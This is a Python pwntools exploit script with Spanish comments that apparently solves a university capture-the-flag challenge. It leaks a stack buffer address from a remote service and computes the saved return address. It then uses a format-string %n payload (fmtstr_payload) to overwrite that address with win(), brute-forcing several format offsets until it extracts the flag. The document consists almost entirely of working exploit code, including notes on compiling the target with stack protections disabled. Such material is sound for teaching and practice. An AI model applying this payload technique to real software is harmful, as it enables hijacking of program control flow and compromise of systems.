#!/usr/bin/env python3
"""
RETOSF - Format String Exploitation
100pts

Objetivo: Explotar una vulnerabilidad de format string para:
1. Leer el buffer address de la pista (%p)
2. Calcular el offset entre buffer y return address
3. Usar %n para sobrescribir return address con win()
4. Al retornar de vuln(), saltar a win() -> flag

El binario imprime: [+] Pista: buffer comienza en: 0xXXXXXXXX

Con pwntools FmtStr, podemos descubrir:
- El offset exacto en el que el printf empieza a leer nuestro buffer
- La distancia entre el buffer y el return address en el stack
- Armar un payload que sobrescriba la dirección de retorno

Compilación esperada:
gcc code-bfs.c -w -O0 -std=c99 -fno-pie -fno-stack-protector -z norelro -z execstack -o retosf
"""

from pwn import *

# Configurar contexto para 32-bit
context.arch = "i386"

def exploit():
    """
    Exploit paso a paso:
    1. Cargar ELF para obtener win_addr
    2. Conectar al servidor remoto
    3. Recibir buffer address desde la pista
    4. Calcular offset hacia return address (fijo: 68 bytes)
    5. Descubrir format string offset con %p
    6. Armar payload con fmtstr_payload
    7. Enviar payload y obtener flag
    """
    
    print("[*] RETOSF - Format String Exploitation\n")
    print("[*] Cargando binario local...")
    try:
        # Intentar con reto-bfs primero (nombre del binario compilado)
        binary_name = "reto-bfs"
        try:
            elf = ELF(binary_name)
        except:
            # Si no existe, intentar con retosf
            binary_name = "retosf"
            elf = ELF(binary_name)
        
        win_addr = elf.symbols['win']
        log.info(f"Binario: {binary_name}")
        log.info(f"win() address = {hex(win_addr)}")
    except FileNotFoundError:
        print("[-] No se encontró ni 'reto-bfs' ni 'retosf'")
        print("[*] Binarios disponibles: reto, reto-bfs, reto-bso")
        return
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        return
    
    print("\n[*] Conectando a ic.catedras.linti.unlp.edu.ar:15023...")
    try:
        p = remote("ic.catedras.linti.unlp.edu.ar", 15023)
    except Exception as e:
        print(f"[-] Error conectando: {e}")
        return
    
    # Recibir la línea de pista
    try:
        line = p.recvline_contains(b"buffer comienza en")
        print(f"[+] Pista recibida: {line.decode().strip()}")
        
        # Parsear la dirección del buffer
        # Formato: [+] Pista: buffer comienza en: 0xXXXXXXXX
        parts = line.strip().split(b": ")
        buf_addr_str = parts[-1].decode()
        buf_addr = int(buf_addr_str, 16)
        log.info(f"Buffer address = {hex(buf_addr)}")
        
    except Exception as e:
        print(f"[-] Error recibiendo pista: {e}")
        p.close()
        return
    
    # Stack layout en vuln():
    # [ebp - 64 ... ebp - 1] = buffer[64]
    # [ebp]                  = saved ebp (4 bytes)
    # [ebp + 4]              = return address (AQUÍ queremos escribir win)
    #
    # Por lo tanto: offset_buffer_to_ret = 64 + 4 = 68 bytes
    
    OFFSET_RET_FROM_BUF = 68
    saved_ret_addr = buf_addr + OFFSET_RET_FROM_BUF
    
    log.info(f"Offset buffer->ret = {OFFSET_RET_FROM_BUF} bytes")
    log.info(f"Saved return address = {hex(saved_ret_addr)}")
    log.info(f"Target: sobrescribir con {hex(win_addr)}")
    
    # Para descubrir el offset del format string, enviamos un payload de prueba
    # que lea la stack y vea dónde aparece nuestro buffer
    print("\n[*] Descubriendo format string offset...")
    
    # Intentamos con offset_fmt = 6 (típico para printf en i386)
    # Si falla, hay que ajustar
    
    offset_fmt_attempts = [6, 7, 8, 5, 9]
    
    for offset_fmt in offset_fmt_attempts:
        print(f"\n[*] Probando offset_fmt={offset_fmt}...")
        
        try:
            payload = fmtstr_payload(offset_fmt, { saved_ret_addr: win_addr })
            
            log.info(f"Payload size: {len(payload)} bytes")
            
            # Enviar el payload
            print(f"[*] Enviando payload...")
            p.sendlineafter(b"Ingrese su input:\n", payload)
            
            # Recibir la respuesta
            print("[*] Esperando respuesta...")
            try:
                output = p.recvall(timeout=3)
                output_str = output.decode(errors='replace')
                print(f"\n[+] OUTPUT:\n{output_str}\n")
                
                if "Wow redireccionaste el flujo" in output_str or "Te mereces una flag" in output_str:
                    print("[+] ¡EXPLOTACIÓN EXITOSA!")
                    if "IC{" in output_str:
                        try:
                            flag = output_str.split("IC{")[1].split("}")[0]
                            print(f"\n[+++] FLAG: IC{{{flag}}}\n")
                        except:
                            pass
                    p.close()
                    return
                    
            except Exception as e:
                print(f"[*] Timeout o error: {e}")
        
        except Exception as e:
            print(f"[-] Error en payload: {e}")
        
        # Si llegamos aquí, este offset no funcionó, reconectamos
        try:
            p.close()
        except:
            pass
        
        # Intentar reconectar para siguiente intento
        try:
            p = remote("ic.catedras.linti.unlp.edu.ar", 15023)
            p.recvline_contains(b"buffer comienza en")  # Consumir la pista de nuevo
        except:
            print("[-] No se puede reconectar. Terminando.")
            return
    
    print("\n[-] Ningún offset funcionó. Verifica los parámetros.")
    p.close()

if __name__ == "__main__":
    exploit()
